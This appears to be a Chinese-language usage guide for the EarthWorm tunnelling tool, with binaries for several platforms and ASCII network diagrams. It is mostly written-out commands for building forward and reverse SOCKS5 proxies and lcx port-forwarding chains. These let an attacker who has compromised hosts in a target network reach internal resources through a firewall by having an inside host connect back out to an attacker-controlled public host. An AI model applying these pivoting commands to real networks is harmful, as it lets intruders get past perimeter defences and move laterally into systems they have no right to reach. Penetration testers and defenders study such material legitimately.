  <h1 class="passage-title">
    EarthWorm
  </h1>
  
  <article class="passage-article">
    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"> EarthWorm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">支持平台列表：（可跨平台反弹）</span><br><span class="line">ew_for_Win.exe        适用各种Windows系统(X86指令集、X64指令集)        Windows7、Windows XP</span><br><span class="line">ew_for_Linux32        各常见Linux发行版 (X86 指令集 CPU)        Ubuntu(X86)/BT5(X86)</span><br><span class="line">ew_for_linux64        各常见Linux发行版 (X64 指令集 CPU)        Ubuntu(X64)/Kali(X64)</span><br><span class="line">ew_for_MacOSX64        MacOS系统发行版 (X64 指令集)        苹果PC电脑，苹果server</span><br><span class="line">ew_for_Arm32        常见Arm-Linux系统        HTC New One(Arm-Android)/小米路由器(R1D)</span><br><span class="line">ew_mipsel        常见Mips-Linux系统 (Mipsel指令集 CPU)        萤石硬盘录像机、小米mini路由器(R1CM)</span><br><span class="line"></span><br><span class="line">普通网络环境：</span><br><span class="line">        1.  目标网络边界存在公网IP且可任意开监听端口：</span><br><span class="line"></span><br><span class="line">                  +---------+     +-------------------+  </span><br><span class="line">                  |HackTools| -&gt;&gt; | 8888-&gt;  1.1.1.1   |</span><br><span class="line">                  +---------+     +-------------------+</span><br><span class="line"></span><br><span class="line">                a)./ew -s ssocksd -l 8888</span><br><span class="line">                        // 在 1.1.1.1 主机上通过这个命令开启 8888 端口的 socks 代理</span><br><span class="line">                b) HackTools 可通过访问 1.1.1.1:8888 端口使用 1.1.1.1 主机提供的代理</span><br><span class="line"></span><br><span class="line">2.目标网络边界不存在公网 IP，需要通过反弹方式创建 socks 代理           </span><br><span class="line">                                        一台可控公网IP主机                  可控内网主机</span><br><span class="line">                  +---------+     +--------------------------+    |     +---------------+</span><br><span class="line">                  |HackTools| -&gt;&gt; | 1080 -&gt;  1.1.1.1 -&gt; 8888 |  防火墙  | &lt;--  2.2.2.2  |</span><br><span class="line">                  +---------+     +--------------------------+    |     +---------------+</span><br><span class="line"></span><br><span class="line">                a) ./ew -s rcsocks -l 1080 -e 8888</span><br><span class="line">                            // 在 1.1.1.1 的公网主机添加转接隧道，将 1080 收到的代理请求转交给反连 8888 端口的主机</span><br><span class="line">                b) ./ew -s rssocks -d 1.1.1.1 -e 8888          </span><br><span class="line">                            // 将目标网络的可控边界主机反向连接公网主机</span><br><span class="line"></span><br><span class="line">                c) HackTools 可通过访问 1.1.1.1:1080 端口使用 rssocks 主机提供的 socks5 代理服务</span><br><span class="line"></span><br><span class="line">对于二重网络环境：        </span><br><span class="line">        1.  获得目标网络内两台主机 A、B 的权限，情况描述如下：</span><br><span class="line"></span><br><span class="line">                A 主机：  存在公网 IP，且自由监听任意端口，无法访问特定资源</span><br><span class="line">                B 主机：  目标网络内部主机，可访问特定资源，但无法访问公网</span><br><span class="line">                A 主机可直连 B 主机              </span><br><span class="line">                                        可控边界主机A             可访问指定资源的主机B</span><br><span class="line">                  +---------+     +-----------------------+      +-----------------+</span><br><span class="line">                  |HackTools| -&gt;&gt; | 1080 --&gt;  2.2.2.2 --&gt; | -&gt;&gt;  | 9999 -&gt; 2.2.2.3 |</span><br><span class="line">                  +---------+     +-----------------------+      +-----------------+</span><br><span class="line"></span><br><span class="line">                a)  ./ew -s ssocksd -l 9999</span><br><span class="line">                        // 在 2.2.2.3 主机上利用 ssocksd 方式启动 9999 端口的 socks 代理</span><br><span class="line">                b)  ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999 </span><br><span class="line">                        // 将 1080 端口收到的 socks 代理请求转交给 2.2.2.3 的主机。</span><br><span class="line">                c)  HackTools 可通过访问 2.2.2.2:1080 来使用 2.2.2.3 主机提供的 socks5 代理。             </span><br><span class="line">        2.  获得目标网络内两台主机 A、B 的权限，情况描述如下：</span><br><span class="line">                A 主机：  目标网络的边界主机，无公网 IP，无法访问特定资源。</span><br><span class="line">                B 主机：  目标网络内部主机，可访问特定资源，却无法回连公网。</span><br><span class="line"></span><br><span class="line">                A 主机可直连 B 主机</span><br><span class="line">                                      一台可控公网IP主机                    可控内网主机A         可访问指定资源的主机B</span><br><span class="line">                  +---------+     +--------------------------+    |    +-----------------+      +-----------------+</span><br><span class="line">                  |HackTools| -&gt;&gt; | 1080 -&gt;  1.1.1.1 -&gt; 8888 |  防火墙  | &lt;--  2.2.2.2 --&gt; | -&gt;&gt; | 9999 -&gt; 2.2.2.3 |</span><br><span class="line">                  +---------+     +--------------------------+    |    +-----------------+      +-----------------+</span><br><span class="line"></span><br><span class="line">                a)  ./ew -s lcx_listen -l 1080 -e 8888</span><br><span class="line">                            // 在 1.1.1.1 公网主机添加转接隧道，将 1080 收到的代理请求</span><br><span class="line">                            // 转交给反连 8888 端口的主机</span><br><span class="line">                b)  ./ew -s ssocksd -l 9999</span><br><span class="line">                            // 在 2.2.2.3 主机上利用 ssocksd 方式启动 9999 端口的 socks 代理</span><br><span class="line">                c)  ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999</span><br><span class="line">                            // 在 2.2.2.2 上，通过工具的 lcx_slave 方式，打通1.1.1.1:8888 和 2.2.2.3:9999 之间的通讯隧道</span><br><span class="line">                d)  HackTools 可通过访问 1.1.1.1:1080 来使用 2.2.2.3 主机提供的 socks5 代理</span><br><span class="line"></span><br><span class="line">【参数说明】</span><br><span class="line">    目前工具提供六种链路状态，可通过 -s 参数进行选定，分别为:</span><br><span class="line">        ssocksd   rcsocks   rssocks   </span><br><span class="line">        lcx_slave lcx_tran  lcx_listen</span><br><span class="line"></span><br><span class="line">        其中 SOCKS5 服务的核心逻辑支持由 ssocksd 和 rssocks 提供，分别对应正向与反向socks代理。</span><br><span class="line">        其余的 lcx 链路状态用于打通测试主机同 socks 服务器之间的通路。</span><br><span class="line">    </span><br><span class="line">    lcx 类别管道：</span><br><span class="line">        lcx_slave  该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。</span><br><span class="line">        lcx_tran   该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。</span><br><span class="line">        lcx_listen 该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。</span><br><span class="line">    </span><br><span class="line">        下面是一个三级跳的本地测试例子。。。</span><br><span class="line">        ./ew -s rcsocks -l 1080 -e 8888</span><br><span class="line">        ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</span><br><span class="line">        ./ew -s lcx_listen -l 9999 -e 7777</span><br><span class="line">        ./ew -s rssocks -d 127.0.0.1 -e 7777</span><br><span class="line"></span><br><span class="line">        数据流向为   IE -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks </span><br><span class="line"></span><br><span class="line">-l listenport打开服务启动的端口。</span><br><span class="line">-d refhost设置反射主机地址。</span><br><span class="line">-e refport设置反射端口。</span><br><span class="line">-f connhost设置连接主机地址。</span><br><span class="line">-g connport设置连接端口。</span><br></pre></td></tr></table></figure>
